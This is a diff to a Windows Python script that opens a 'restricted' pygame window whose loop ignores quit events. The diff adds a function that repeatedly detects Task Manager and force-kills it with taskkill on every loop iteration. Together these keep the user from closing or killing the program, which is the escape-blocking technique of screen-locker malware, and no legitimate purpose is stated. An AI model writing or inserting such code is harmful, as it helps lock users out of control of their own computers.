@@ -8,6 +8,9 @@ import ctypes
 import ctypes.wintypes
 from time import sleep
 
+
+
+
 def minimize_all_programs_builtin():
     """
     Minimize all windows using only Windows API (no external dependencies).
@@ -35,6 +38,31 @@ def minimize_all_programs_builtin():
     ctypes.windll.user32.EnumWindows(callback, 0)
     return True
 
+
+
+
+def kill_task_manager_if_running():
+    """Check if Task Manager is running and kill it if it is"""
+    try:
+        # Check if Taskmgr.exe is running
+        result = subprocess.run(
+            ['tasklist', '/FI', 'IMAGENAME eq Taskmgr.exe'],
+            capture_output=True,
+            text=True
+        )
+        
+        # If Taskmgr.exe is found in the task list
+        if 'Taskmgr.exe' in result.stdout:
+            print("Task Manager is running, killing it...")
+            subprocess.run(['taskkill', '/F', '/IM', 'Taskmgr.exe'], capture_output=True)
+            return True
+        else:
+            print("Task Manager is not running")
+            return False
+            
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
 
 def create_restricted_window():
 
@@ -102,6 +130,7 @@ def create_restricted_window():
     
     running = True
     while running:
+        kill_task_manager_if_running()
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
                 continue
